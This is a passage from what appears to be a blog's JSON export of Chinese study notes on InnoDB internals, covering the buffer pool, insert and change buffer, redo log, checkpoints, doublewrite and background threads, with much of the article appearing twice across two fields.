Buffer，所以需要这个顺序回放才能得到记录的正确值。</p>\n<blockquote>\n<p>注：</p>\n<ol>\n<li>IBUF_REC_OFFSET_TYPE和IBUF_REC_OFFSET_FLAGS暂时我也没理解清楚，可能与，后面的索引页类型有关</li>\n<li>接下来关于Insert Buffer Bitmap这一块，我也没懂，仅做知识点记录，以后弄明白了再补充</li>\n</ol>\n</blockquote>\n<p>启用Insert Buffer索引后，辅助索引页(space, page_no)中的记录可能被插入到B+树中，为了保证每次Merge Insert Buffer页必须成功，还需要一个特殊的页用来标记每个辅助索引页的可用空间，这个页的类型是Insert Buffer Bitmap。</p>\n<p>每个Insert Buffer Bitmap页用来追踪16384个辅助索引页，即256个区（Extent）（所以一个区是64个页，一个区1MB ）。每个Insert Buffer Bitmap页都在16384个页的第二个页中。每个辅助索引页在Insert Buffer Bitmap页中占用4位(bit)，如下所示：</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>大小(bit)</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>IBUF_BITMAP_FREE</td>\n<td>2</td>\n<td>0 -&gt; 无可用剩余空间<br>1 -&gt; 剩余空间大于1/32页(512字节)<br>2 -&gt; 剩余空间大于1/16页<br>3 -&gt; 剩余空间大于1/8页</td>\n</tr>\n<tr>\n<td>IBUF_BITMAP_BUFFERED</td>\n<td>1</td>\n<td>1表示辅助索引页有记录被缓存在Insert Buffer B+树中</td>\n</tr>\n<tr>\n<td>IBUF_BITMAP_IBUF</td>\n<td>1</td>\n<td>1表示该页位Insert Buffer B+树的索引页</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>注：总结有以下几个没弄明白的点：<br>1.在硬盘上，辅助索引是如何划分页的，如何存储，随着数据的随机新增页的划分不会发生大范围的变化吗<br>2.Insert Buffer B+树叶子节点中的记录具体结构什么样（是单个索引记录还是整页记录）<br>3.Insert Buffer Bitmap在Insert Buffer B+树上吗，如何存在，它追踪16384个页数量的原因</p>\n</blockquote>\n<h4 id=\"Change-Buffer\"><a href=\"#Change-Buffer\" class=\"headerlink\" title=\"Change Buffer\"></a>Change Buffer</h4><p>Change Buffer是InnoDB从1.0.X版本起引入的，可视为Insert Buffer的升级，可以对DML操作——INSERT、DELETE、UPDATE——都进行缓冲，分别是：Insert Buffer、Delete Buffer、Purge Buffer。</p>\n<p>Update操作分为两个步骤：</p>\n<ol>\n<li>将记录标记为已删除——对应Delete Buffer</li>\n<li>真正将记录删除——对应Purge Buffer</li>\n</ol>\n<h4 id=\"UNDO页\"><a href=\"#UNDO页\" class=\"headerlink\" title=\"UNDO页\"></a>UNDO页</h4><p>为了满足事务的原子性，在操作任何数据之前，首先将数据备份到一个地方（这个存储备份的地方称为Undo Log），然后进行数据的修改，这样在rollback时，可以利用Undo Log中备份的undo页将数据恢复到事务开始之前的状态。</p>\n<h4 id=\"自适应哈希索引\"><a href=\"#自适应哈希索引\" class=\"headerlink\" title=\"自适应哈希索引\"></a>自适应哈希索引</h4><p>InnoDB存储引擎会监控对表上各索引页的查询。如果观察到建立哈希索引可以带来速度提升，则建立哈希索引，称之为自适应哈希索引（Adaptive Hash Index, AHI）。AHI是通过缓冲池的B+数页构造而来的，因此建立速度很快，而且不需要对整张表构建哈希索引。InnoDB存储引擎会自动根据访问的频率和模式来自动地为某些热点页建立哈希索引。</p>\n<p>AHI有一个要求，即对这个页的连续访问模式必须是一样的。例如对于（a，b）这样的联合索引，其访问模式可以是以下情况：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WHERE a=xxx</span><br><span class=\"line\">WHERE a=xxx AND b=xxxx</span><br></pre></td></tr></table></figure>\n\n<p>若交替进行上述两种查询，那么不会对该页构造AHI。另外，还有如下要求：</p>\n<ol>\n<li>以该模式访问了100次</li>\n<li>页通过该模式访问了N次，其中N=页中记录/16</li>\n</ol>\n<p>正如一般所知的哈希索引，自适应哈希索引也只能进行等值查询，范围查询是不能使用哈希索引的。</p>\n<p>默认自适应哈希索引是开启的，可以通过<code>innodb_adaptive_hash_index</code>来配置禁用或启动此特性。</p>\n<h3 id=\"2-重做日志缓冲\"><a href=\"#2-重做日志缓冲\" class=\"headerlink\" title=\"2. 重做日志缓冲\"></a>2. 重做日志缓冲</h3><p>重做日志是InnoDB引擎对其本身事务操作的日志记录，记录了关于每个页的更改的物理情况。重做日志的存在能够避免宕机造成数据的丢失。</p>\n<p>在InnoDB中，为了协调CPU与磁盘速度的鸿沟，页的操作首先都是在缓冲池中完成的。重做日志也一样，InnoDB引擎首先将重做日志信息放入到内存中（即重做日志缓冲），然后按一定频率将其刷新到重做日志文件。重做日志缓冲一般不需要设置太大，因为一般情况下每一秒中会将其刷新到重做日志文件，因此只需要保证每秒产生的事务量在这个缓冲大小之内即可（可通过<code>innodb_log_buffer_size</code>控制其大小，默认8MB）。重做日志文件会在三种情况下刷新到重做日志文件：</p>\n<ol>\n<li>主线程每秒刷新一次</li>\n<li>每个事务提交时，会将重做日志缓冲刷新到重做日志文件</li>\n<li>当重做日志缓冲池剩余空间小于1/2时刷新</li>\n</ol>\n<p>当前事务数据库系统普遍采用Write Ahead Log策略，即当事务提交时，先写重做日志，再对页数据进行修改。因此当发生宕机而导致数据丢失时，可通过重做日志完成数据的恢复，当然未刷新到日志文件的重做日志（1秒以内）还是会有所丢失。</p>\n<p><strong>为什么需要重做日志</strong></p>\n<p>如果没有重做日志存在，将数据页刷新到硬盘都将直接操作数据文件，当从缓冲池将页的新版本刷新到硬盘时发生宕机，可能出现部分已写入部分未写入的情况，因为没有重做日志的存在，无法定位哪些页未写入。</p>\n<blockquote>\n<p>注意：重做日志文件的主要作用不是避免宕机造成的数据丢失，而是避免因宕机造成的数据文件的不完整。数据恢复只是不可靠的顺带的功能。BinLog文件才是真正为避免数据丢失而生的。</p>\n</blockquote>\n<h3 id=\"3-额外内存池\"><a href=\"#3-额外内存池\" class=\"headerlink\" title=\"3. 额外内存池\"></a>3. 额外内存池</h3><p>在InnoDB存储引擎中，对内存的管理是通过内存堆的方式进行的。在对数据结构本身的内存进行分配时，需要从额外的内存池中进行申请，当该区域的内存不足时，会从缓冲池中申请。例如，分配了缓冲池，但是每个缓冲池中的帧缓冲还有对应的缓冲控制对象（Buffer Control Block），这些对象记录了一些注入LRU、锁、等待等信息，而这个对象的内存需要从额外内存池中申请。因此，当申请了很大的InnoDB缓冲池时，也应考虑相应地增加这个值。</p>\n<h2 id=\"其他技术与特性\"><a href=\"#其他技术与特性\" class=\"headerlink\" title=\"其他技术与特性\"></a>其他技术与特性</h2><h3 id=\"1-CHECKPOINT技术\"><a href=\"#1-CHECKPOINT技术\" class=\"headerlink\" title=\"1. CHECKPOINT技术\"></a>1. CHECKPOINT技术</h3><p>CheckPoint（检查点）技术与前面说过的重做日志有密切地关系。重做日志是用于防止因宕机导致数据文件损坏，更改记录被刷新到硬盘后，这部分的日志便已经不再需要了，可以被覆盖。因此重做日志文件被设计成可以循环使用的，一般重做日志文件有两个（也可以设置成超过两个文件），循环使用这两个文件。</p>\n<p>要能使用重做日志来恢复数据，必须知道哪些版本数据已经刷入硬盘，哪些版本未刷入硬盘。基于此，就有了检查点（CheckPoint）技术。对于InnnoDB存储引擎而言，其是通过LSN（Log Sequence Number）来标记版本的，LSN是8字节地数字，其单位是字节。每个页有LSN，重做日志中也有LSN，CheckPoint也有LSN，CheckPoint前的数据都已经被刷入硬盘，通过比对CheckPoint的LSN和重做日志中的LSN便能知道哪些版本数据未刷入硬盘。</p>\n<p>在InnoDB中，CheckPoint发生的时间、条件、脏页的选择、刷新脏页的数量都非常复杂。CheckPoint的发生主要有以下几种：</p>\n<ol>\n<li>数据库关闭时，将所有的脏页都刷回硬盘，这是默认都有的（<code>innodb_fast_shutdown=1</code>）</li>\n<li>主线程每1秒、每10秒从缓冲池的列表中刷新一定比例的页回磁盘，这个过程是异步的</li>\n<li>InnoDB引擎需要保证LRU列表中有差不多100个空闲页可供使用，Cleaner线程会检测，如果没有则会将LRU列表尾端的页移除，如果这些页中有脏页（在<code>Flush列表</code>中），则会进行CheckPoint。（InnoDB1.2.X开始LRU可用页的数量默认值为1024，且可通过<code>innodb_lru_scan_depth</code>控制）</li>\n<li>当重做日志文件达到<code>75% * total_redo_log_file_size</code>时（<code>total_redo_log_file_size</code>是所有重做日志文件的总大小），会执行阻塞发现问题的用户查询线程执行Async Flush CheckPoint；当重做日志文件达到<code>90% * total_redo_log_file_size</code>时，会阻塞所有用户查询线程执行Sync Flush CheckPoint。从InnoDB1.2.X开始，在Cleaner线程执行，不会阻塞用户查询线程</li>\n<li>当缓冲池中脏页数量达到<code>innodb_max_dirty_page_pct</code>（默认75%）时，强制执行CheckPoint</li>\n</ol>\n<h3 id=\"2-刷新临接页\"><a href=\"#2-刷新临接页\" class=\"headerlink\" title=\"2. 刷新临接页\"></a>2. 刷新临接页</h3><p>InnoDB还存在了刷新临接页的特性：当刷新一个脏页时，InnoDB存储引擎会检测该页所在区的所有页，如果是脏页，那么一起刷新。可以由参数<code>innodb_flush_neighbors</code>来配置启用或关闭此特性（值0表示关闭）。</p>\n<h3 id=\"3-异步IO\"><a href=\"#3-异步IO\" class=\"headerlink\" title=\"3. 异步IO\"></a>3. 异步IO</h3><p>InnoDB采用异步IO（Asynchronous IO, AIO）的方式来处理磁盘操作，AIO的一个优势是可以对多个索引页进行并发扫描，另一个优势是可以进行IO Merge操作，将多个IO合并为一个IO，例如用户需要访问的页（space, page_no）为（8，6)、（8，7）、（8，8），每个页大小16KB，AIO会判断这三个页是连续的，AIO底层会发送一个IO请求，读取48KB的页。</p>\n<p>在InnoDB1.1.X之前，AIO实现是通过InnoDB引擎代码模拟实现，从InnoDB1.1.X开始，提供了内核级别的AIO支持，称为Native AIO，因此编译或允许该版本MySQL时需要libaio库的支持。Native AIO需要操作系统提供支持，Windows系统和Linux系统都提供Native AIO支持，而Mac OSX系统则未提供，只能依旧使用原模拟的方式。</p>\n<p>可以通过参数<code>innodb_use_native_aio</code>来控制启用Native AIO，Linux系统下默认启用（ON）。</p>\n<h3 id=\"4-两次写\"><a href=\"#4-两次写\" class=\"headerlink\" title=\"4. 两次写\"></a>4. 两次写</h3><p>当数据库宕机时，可能InnoDB正在写入某个页到表中，而这个页只写了一部分，比如16KB的页，只写了前4KB，之后就发生了宕机，这种情况被称为部分写失效。有经验的DBA也许会想如果发生写失效，可以通过重做日志进行恢复。但实际上并不一定可以修复，页内数据有可能本身发生损坏（这与重做日志记录的内容有关，参考<a href=\"https://blog.csdn.net/jolly10/article/details/79791574\" target=\"_blank\" rel=\"noopener\">mysql 为何需要Double Write？有redo log还不够吗？</a>，估计是因为重做日志在页内的记录与最终写入磁盘的并不是完全相同的，还会经过一次与底层结构相关的计算），需要先通过页的副本来还原页，再进行重做，这个副本就就是doublewrite的内容。</p>\n<p>doublewrite由两部分组成，一部分是内存中的doublewrite buffer，大小为2MB，另一部分是物理磁盘上共享表空间中的连续的2个区（128个页，也是2MB）。在对缓冲区进行刷新时，并不直接写磁盘，而是会通过memcpy函数将页先复制到内存中的doublewrite buffer，之后通过doublewrite  buffer再分两次，每次1MB顺序地写入共享表空间的物理磁盘上，然后马上调用fsync函数，同步磁盘，避免缓冲带来的问题。由于doublewrite页是连续的，因此这个过程是顺序写的，开销并不是很大。在完成doublewrite页写入后，再将doublewrie buffer中的页写入各个表空间文件中，此时写入是离散的。</p>\n<p>参数<code>skip_innodb_doublewrite</code>可以禁止使用doublewrite功能，有些情况下，这是需要的，如：用户有多个从服务器（在从服务器上做的是RAID0），可以在从服务器上关闭doublewrite功能；有些文件系统（ZFS文件系统）本身提供了部分写失效的防范机制，就不用开启doublewrite功能。</p>\n<p><img src=\"../static/MB20031501-6.png\" alt=\"图1\"></p>\n<h2 id=\"后台线程\"><a href=\"#后台线程\" class=\"headerlink\" title=\"后台线程\"></a>后台线程</h2><h3 id=\"1-Master线程\"><a href=\"#1-Master线程\" class=\"headerlink\" title=\"1. Master线程\"></a>1. Master线程</h3><p>负责将重做日志缓冲刷新到重做日志文件</p>\n<h3 id=\"2-IO线程\"><a href=\"#2-IO线程\" class=\"headerlink\" title=\"2. IO线程\"></a>2. IO线程</h3><p>Async IO，分为4种线程</p>\n<ol>\n<li>Read线程（默认4条线程，由<code>innodb_read_io_thread</code>参数控制）</li>\n<li>Write线程（默认4条线程，由<code>innodb_write_io_thread</code>参数控制）</li>\n<li>Insert Buffer线程（1条线程）</li>\n<li>Log线程（1条线程）</li>\n</ol>\n<h3 id=\"3-Purge线程\"><a href=\"#3-Purge线程\" class=\"headerlink\" title=\"3. Purge线程\"></a>3. Purge线程</h3><p>支持设置多个线程，由<code>innodb_purge_threads</code>控制</p>\n<p>负责任务UNDO页回收，<code>innodb_purge_batch_size</code>控制每次回收数量</p>\n<h3 id=\"4-Cleaner线程\"><a href=\"#4-Cleaner线程\" class=\"headerlink\" title=\"4. Cleaner线程\"></a>4. Cleaner线程</h3><p>负责将缓冲池中的脏页刷新到磁盘</p>\n","site":{"data":{}},"excerpt":"","more":"<p>InnoDB存储引擎具有行锁设计、支持事务、支持外键、支持MVCC、支持插入缓冲、支持自适应哈希索引等特点，其整体体系架构主要由后台线程、内存池、文件系统三部分组成，如下图所示：</p>\n<p><img src=\"../static/MB20031501-1.png\" alt=\"图1\"></p>\n<p>接下来会针对后台线程和内存池展开介绍。</p>\n<h2 id=\"内存池\"><a href=\"#内存池\" class=\"headerlink\" title=\"内存池\"></a>内存池</h2><p>内存池从大的方面可以分为三块：重做日志缓冲（redo log buffer）、缓冲池（buffer pool）、额外内存池（additional memery pool）。缓冲池中缓存的数据页类型有：数据页（data page），索引页（index page）、插入缓冲（insert buffer）、锁信息（lock info）、自适应哈希索引（adaptive hash index）、数据字典（data dictionary）、undo页等。缓冲池从1.0.X版本开始，允许有多个实例，根据哈希值将每个页平均分配到不同的实例中。</p>\n<p><img src=\"../static/MB20031501-2.png\" alt=\"图2\"></p>\n<h3 id=\"1-缓冲池\"><a href=\"#1-缓冲池\" class=\"headerlink\" title=\"1. 缓冲池\"></a>1. 缓冲池</h3><p>Innodb是基于磁盘存储的数据库，CPU速度和磁盘速度之间存在巨大的鸿沟，磁盘速度较慢严重降低了数据库系统的性能。基于这个问题，数据库在内存中开辟了一块区域作为缓冲池来弥补两者之间的速度差距。在数据库中读取页时，首先将从磁盘读到的页放在缓冲池中，下次再读相同的页时，首先判断该页是否在缓冲池中，若命中则直接读取该页，否则从磁盘上读取。</p>\n<h4 id=\"LRU列表\"><a href=\"#LRU列表\" class=\"headerlink\" title=\"LRU列表\"></a>LRU列表</h4><p>缓冲池通过LRU（Latest Recent Used，最近使用）算法来进行管理页（数据页、索引页），最频繁使用的排在<code>LRU列表</code>前端，反之，排在末端。当缓冲池不能存放新读取到的页时，首先释放<code>LRU列表</code>末端的页。</p>\n<p>Innodb在LRU算法上做了一些调整。一些的一次性读取大量页的SQL操作会将缓冲池中的页大量刷出，从而影响缓冲池的效率（页缓冲池缓存频繁使用页的初衷不符）。为了解决这个问题，Innodb在LRU算法上引入了midpoint概念，midpoint点将<code>LRU列表</code>一分为二，<code>LRU列表</code>前端至midpoint点为<code>new列表</code>，midpoint点至<code>LRU列表</code>末端为<code>old列表</code>。<code>new列表</code>和<code>old列表</code>各自都以LRU算法管理，新读取的页被加入<code>old列表</code>，只有在<code>old列表</code>中存活一定时间(<code>innodb_old_blocks_time</code>)以后才会被加入<code>new列表</code>，可以看出<code>new列表</code>中的页都是最为活跃的热点数据。midpoint默认值是37%，即默认<code>old列表</code>占完整LRU列表的37%，由参数<code>innodb_old_blocks_pct</code>控制。</p>\n<p><img src=\"../static/MB20031501-3.png\" alt=\"图3\"></p>\n<p><code>LRU列表</code>中存储的页数上限是确定的，Innodb引入了<code>Free列表</code>来与<code>LRU列表</code>共同管理，未分配的页由<code>Free列表</code>进行管理，<code>Free列表</code>当前页数加<code>LRU列表</code>当前页数等于<code>LRU列表</code>可容纳的总页数。新读取页时，首先从<code>Free列表</code>中查找是否有空闲页，若有则将空闲页从<code>Free列表</code>移到<code>LRU列表</code>中，否则根据规则淘汰<code>LRU列表</code>末尾的页。</p>\n<p>InnoDB中页的大小是16KB，InnoDB从1.0.X开始，支持压缩页功能，可以将部分页压缩为1KB、2KB、4KB、8KB，对于非16KB的页，使用<code>unzip_LRU列表</code>管理。如需要申请4KB大小的页时，通过伙伴算法进行分配，过程如下：</p>\n<ol>\n<li>检查4KB的<code>unzip_LRU列表</code>，检查是否有可用空闲页，若有则直接使用</li>\n<li>检查8KB的<code>unzip_LRU列表</code>，若有空闲页，将页分成2个4KB页，存放到4KB的<code>unzip_LRU列表</code></li>\n<li>从<code>LRU列表</code>申请一个16KB的页，将页分成1个8KB的页和2个4KB的页，分别存放到对应的<code>unzip_LRU列表</code>中</li>\n</ol>\n<h4 id=\"脏页\"><a href=\"#脏页\" class=\"headerlink\" title=\"脏页\"></a>脏页</h4><p><code>LRU列表</code>中的页被修改后，该页称为脏页（dirty page），脏页既存在于<code>LRU列表</code>中又存在于<code>Flush列表</code>中，会通过<code>CheckPoint机制</code>被刷新会磁盘。</p>\n<h4 id=\"插入缓冲\"><a href=\"#插入缓冲\" class=\"headerlink\" title=\"插入缓冲\"></a>插入缓冲</h4><p><strong>插入缓冲主要是针对，插入操作时在非唯一的非聚集索引上进行离散插入会导致性能下降，这个问题设计的</strong>。对于聚集索引，与数据的物理存储顺序是一致的，不用担心性能问题，但对于B+树结构下的非聚集索引这是需要考虑的问题。</p>\n<p>这里需要注意的两点是：</p>\n<ol>\n<li>插入缓冲针对的是非聚集索引，不要因为名字就认为针对的是数据页</li>\n<li>插入缓冲管辖的非聚集索引必须是非唯一的索引</li>\n</ol>\n<p>InnoDB存储引擎设计了Insert Buffer（插入缓冲），对于非聚集索引的插入或更新操作，不是每一次直接插入到索引页中，而是先判断插入的非聚集索引页是否在缓冲池中，若在则直接插入，否则先放入到Insert Buffer对象中，好似欺骗。之后主线程会异步地进行合并插入缓冲的工作，这样就大大提高了非聚集索引的插入效率。</p>\n<p>Insert Buffer的数据结构是一棵B+树，在MySQL4.1之前每张表有一棵B+树，而现在版本中全局只有一棵B+树，这棵B+树存放在共享表空间中，默认也就是<code>ibdata1文件</code>中。因此，试图通过独立表空间<code>.ibd文件</code>恢复表中数据时，往往会导致CHECK TABLE失败。这是因为表的辅助索引中的数据可能还在Insert Buffer中，所以通过<code>.ibd文件</code>进行恢复后，还需要进行REPAIR TABLE操作来重建表上所有的辅助索引。</p>\n<p><strong>B+树数据结构</strong></p>\n<p>Insert Buffer B+树非叶子节点存放的是查询的search key，其结构如下所示：space占用4字节，表示插入的表空间的id（InnoDB中每个表都有一个唯一的space id）；marker占用1字节，用于兼容老版本Insert Buffer；page_no占用4字节，表示页所在的偏移量</p>\n<p><img src=\"../static/MB20031501-4.png\" alt=\"图4\"></p>\n<p>Insert Buffer B+树叶子节点的记录，结构如下图所示</p>\n<p><img src=\"../static/MB20031501-5.png\" alt=\"图5\"></p>\n<p>space、marker、page_no字段和非叶子节点中的含义相同，一共9个字节，metadata字段占用4个字节，存储内容如下</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">名称</th>\n<th align=\"center\">字节</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">IBUF_REC_OFFSET_COUNT</td>\n<td align=\"center\">2</td>\n</tr>\n<tr>\n<td align=\"center\">IBUF_REC_OFFSET_TYPE</td>\n<td align=\"center\">1</td>\n</tr>\n<tr>\n<td align=\"center\">IBUF_REC_OFFSET_FLAGS</td>\n<td align=\"center\">1</td>\n</tr>\n</tbody></table>\n<p>IBUF_REC_OFFSET_COUNT用来排序每个记录进入Insert Buffer的顺序，因为Innodb从1.0.X开始支持Change Buffer，所以需要这个顺序回放才能得到记录的正确值。</p>\n<blockquote>\n<p>注：</p>\n<ol>\n<li>IBUF_REC_OFFSET_TYPE和IBUF_REC_OFFSET_FLAGS暂时我也没理解清楚，可能与，后面的索引页类型有关</li>\n<li>接下来关于Insert Buffer Bitmap这一块，我也没懂，仅做知识点记录，以后弄明白了再补充</li>\n</ol>\n</blockquote>\n<p>启用Insert Buffer索引后，辅助索引页(space, page_no)中的记录可能被插入到B+树中，为了保证每次Merge Insert Buffer页必须成功，还需要一个特殊的页用来标记每个辅助索引页的可用空间，这个页的类型是Insert Buffer Bitmap。</p>\n<p>每个Insert Buffer Bitmap页用来追踪16384个辅助索引页，即256个区（Extent）（所以一个区是64个页，一个区1MB ）。每个Insert Buffer Bitmap页都在16384个页的第二个页中。每个辅助索引页在Insert Buffer Bitmap页中占用4位(bit)，如下所示：</p>\n<table>\n<thead>\n<tr>\n<th>名称</th>\n<th>大小(bit)</th>\n<th>说明</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>IBUF_BITMAP_FREE</td>\n<td>2</td>\n<td>0 -&gt; 无可用剩余空间<br>1 -&gt; 剩余空间大于1/32页(512字节)<br>2 -&gt; 剩余空间大于1/16页<br>3 -&gt; 剩余空间大于1/8页</td>\n</tr>\n<tr>\n<td>IBUF_BITMAP_BUFFERED</td>\n<td>1</td>\n<td>1表示辅助索引页有记录被缓存在Insert Buffer B+树中</td>\n</tr>\n<tr>\n<td>IBUF_BITMAP_IBUF</td>\n<td>1</td>\n<td>1表示该页位Insert Buffer B+树的索引页</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>注：总结有以下几个没弄明白的点：<br>1.在硬盘上，辅助索引是如何划分页的，如何存储，随着数据的随机新增页的划分不会发生大范围的变化吗<br>2.Insert Buffer B+树叶子节点中的记录具体结构什么样（是单个索引记录还是整页记录）<br>3.Insert Buffer Bitmap在Insert Buffer B+树上吗，如何存在，它追踪16384个页数量的原因</p>\n</blockquote>\n<h4 id=\"Change-Buffer\"><a href=\"#Change-Buffer\" class=\"headerlink\" title=\"Change Buffer\"></a>Change Buffer</h4><p>Change Buffer是InnoDB从1.0.X版本起引入的，可视为Insert Buffer的升级，可以对DML操作——INSERT、DELETE、UPDATE——都进行缓冲，分别是：Insert Buffer、Delete Buffer、Purge Buffer。</p>\n<p>Update操作分为两个步骤：</p>\n<ol>\n<li>将记录标记为已删除——对应Delete Buffer</li>\n<li>真正将记录删除——对应Purge Buffer</li>\n</ol>\n<h4 id=\"UNDO页\"><a href=\"#UNDO页\" class=\"headerlink\" title=\"UNDO页\"></a>UNDO页</h4><p>为了满足事务的原子性，在操作任何数据之前，首先将数据备份到一个地方（这个存储备份的地方称为Undo Log），然后进行数据的修改，这样在rollback时，可以利用Undo Log中备份的undo页将数据恢复到事务开始之前的状态。</p>\n<h4 id=\"自适应哈希索引\"><a href=\"#自适应哈希索引\" class=\"headerlink\" title=\"自适应哈希索引\"></a>自适应哈希索引</h4><p>InnoDB存储引擎会监控对表上各索引页的查询。如果观察到建立哈希索引可以带来速度提升，则建立哈希索引，称之为自适应哈希索引（Adaptive Hash Index, AHI）。AHI是通过缓冲池的B+数页构造而来的，因此建立速度很快，而且不需要对整张表构建哈希索引。InnoDB存储引擎会自动根据访问的频率和模式来自动地为某些热点页建立哈希索引。</p>\n<p>AHI有一个要求，即对这个页的连续访问模式必须是一样的。例如对于（a，b）这样的联合索引，其访问模式可以是以下情况：</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">WHERE a=xxx</span><br><span class=\"line\">WHERE a=xxx AND b=xxxx</span><br></pre></td></tr></table></figure>\n\n<p>若交替进行上述两种查询，那么不会对该页构造AHI。另外，还有如下要求：</p>\n<ol>\n<li>以该模式访问了100次</li>\n<li>页通过该模式访问了N次，其中N=页中记录/16</li>\n</ol>\n<p>正如一般所知的哈希索引，自适应哈希索引也只能进行等值查询，范围查询是不能使用哈希索引的。</p>\n<p>默认自适应哈希索引是开启的，可以通过<code>innodb_adaptive_hash_index</code>来配置禁用或启动此特性。</p>\n<h3 id=\"2-重做日志缓冲\"><a href=\"#2-重做日志缓冲\" class=\"headerlink\" title=\"2. 重做日志缓冲\"></a>2. 重做日志缓冲</h3><p>重做日志是InnoDB引擎对其本身事务操作的日志记录，记录了关于每个页的更改的物理情况。重做日志的存在能够避免宕机造成数据的丢失。</p>\n<p>在InnoDB中，为了协调CPU与磁盘速度的鸿沟，页的操作首先都是在缓冲池中完成的。重做日志也一样，InnoDB引擎首先将重做日志信息放入到内存中（即重做日志缓冲），然后按一定频率将其刷新到重做日志文件。重做日志缓冲一般不需要设置太大，因为一般情况下每一秒中会将其刷新到重做日志文件，因此只需要保证每秒产生的事务量在这个缓冲大小之内即可（可通过<code>innodb_log_buffer_size</code>控制其大小，默认8MB）。重做日志文件会在三种情况下刷新到重做日志文件：</p>\n<ol>\n<li>主线程每秒刷新一次</li>\n<li>每个事务提交时，会将重做日志缓冲刷新到重做日志文件</li>\n<li>当重做日志缓冲池剩余空间小于1/2时刷新</li>\n</ol>\n<p>当前事务数据库系统普遍采用Write Ahead Log策略，即当事务提交时，先写重做日志，再对页数据进行修改。因此当发生宕机而导致数据丢失时，可通过重做日志完成数据的恢复，当然未刷新到日志文件的重做日志（1秒以内）还是会有所丢失。</p>\n<p><strong>为什么需要重做日志</strong></p>\n<p>如果没有重做日志存在，将数据页刷新到硬盘都将直接操作数据文件，当从缓冲池将页的新版本刷新到硬盘时发生宕机，可能出现部分已写入部分未写入的情况，因为没有重做日志的存在，无法定位哪些页未写入。</p>\n<blockquote>\n<p>注意：重做日志文件的主要作用不是避免宕机造成的数据丢失，而是避免因宕机造成的数据文件的不完整。数据恢复只是不可靠的顺带的功能。BinLog文件才是真正为避免数据丢失而生的。</p>\n</blockquote>\n<h3 id=\"3-额外内存池\"><a href=\"#3-额外内存池\" class=\"headerlink\" title=\"3. 额外内存池\"></a>3. 额外内存池</h3><p>在InnoDB存储引擎中，对内存的管理是通过内存堆的方式进行的。在对数据结构本身的内存进行分配时，需要从额外的内存池中进行申请，当该区域的内存不足时，会从缓冲池中申请。例如，分配了缓冲池，但是每个缓冲池中的帧缓冲还有对应的缓冲控制对象（Buffer Control Block），这些对象记录了一些注入LRU、锁、等待等信息，而这个对象的内存需要从额外内存池中申请。因此，当申请了很大的InnoDB缓冲池时，也应考虑相应地增加这个值。</p>\n<h2 id=\"其他技术与特性\"><a href=\"#其他技术与特性\" class=\"headerlink\" title=\"其他技术与特性\"></a>其他技术与特性</h2><h3 id=\"1-CHECKPOINT技术\"><a href=\"#1-CHECKPOINT技术\" class=\"headerlink\" title=\"1. CHECKPOINT技术\"></a>1. CHECKPOINT技术</h3><p>CheckPoint（检查点）技术与前面说过的重做日志有密切地关系。重做日志是用于防止因宕机导致数据文件损坏，更改记录被刷新到硬盘后，这部分的日志便已经不再需要了，可以被覆盖。因此重做日志文件被设计成可以循环使用的，一般重做日志文件有两个（也可以设置成超过两个文件），循环使用这两个文件。</p>\n<p>要能使用重做日志来恢复数据，必须知道哪些版本数据已经刷入硬盘，哪些版本未刷入硬盘。基于此，就有了检查点（CheckPoint）技术。对于InnnoDB存储引擎而言，其是通过LSN（Log Sequence Number）来标记版本的，LSN是8字节地数字，其单位是字节。每个页有LSN，重做日志中也有LSN，CheckPoint也有LSN，CheckPoint前的数据都已经被刷入硬盘，通过比对CheckPoint的LSN和重做日志中的LSN便能知道哪些版本数据未刷入硬盘。</p>\n<p>在InnoDB中，CheckPoint发生的时间、条件、脏页的选择、刷新脏页的数量都非常复杂。CheckPoint的发生主要有以下几种：</p>\n<ol>\n<li>数据库关闭时，将所有的脏页都刷回硬盘，这是默认都有的（<code>innodb_fast_shutdown=1</code>）</li>\n<li>主线程每1秒、每10秒从缓冲池的列表中刷新一定比例的页回磁盘，这个过程是异步的</li>\n<li>InnoDB引擎需要保证LRU列表中有差不多100个空闲页可供使用，Cleaner线程会检测，如果没有则会将LRU列表尾端的页移除，如果这些页中有脏页（在<code>Flush列表</code>中），则会进行CheckPoint。（InnoDB1.2.X开始LRU可用页的数量默认值为1024，且可通过<code>innodb_lru_scan_depth</code>控制）</li>\n<li>当重做日志文件达到<code>75% * total_redo_log_file_size</code>时（<code>total_redo_log_file_size</code>是所有重做日志文件的总大小），会执行阻塞发现问题的用户查询线程执行Async Flush CheckPoint；当重做日志文件达到<code>90% * total_redo_log_file_size</code>时，会阻塞所有用户查询线程执行Sync Flush CheckPoint。从InnoDB1.2.X开始，在Cleaner线程执行，不会阻塞用户查询线程</li>\n<li>当缓冲池中脏页数量达到<code>innodb_max_dirty_page_pct</code>（默认75%）时，强制执行CheckPoint</li>\n</ol>\n<h3 id=\"2-刷新临接页\"><a href=\"#2-刷新临接页\" class=\"headerlink\" title=\"2. 刷新临接页\"></a>2. 刷新临接页</h3><p>InnoDB还存在了刷新临接页的特性：当刷新一个脏页时，InnoDB存储引擎会检测该页所在区的所有页，如果是脏页，那么一起刷新。可以由参数<code>innodb_flush_neighbors</code>来配置启用或关闭此特性（值0表示关闭）。</p>\n<h3 id=\"3-异步IO\"><a href=\"#3-异步IO\" class=\"headerlink\" title=\"3. 异步IO\"></a>3. 异步IO</h3><p>InnoDB采用异步IO（Asynchronous IO, AIO）的方式来处理磁盘操作，AIO的一个优势是可以对多个索引页进行并发扫描，另一个优势是可以进行IO Merge操作，将多个IO合并为一个IO，例如用户需要访问的页（space, page_no）为（8，6)、（8，7）、（8，8），每个页大小16KB，AIO会判断这三个页是连续的，AIO底层会发送一个IO请求，读取48KB的页。</p>\n<p>在InnoDB1.1.X之前，AIO实现是通过InnoDB引擎代码模拟实现，从InnoDB1.1.X开始，提供了内核级别的AIO支持，称为Native 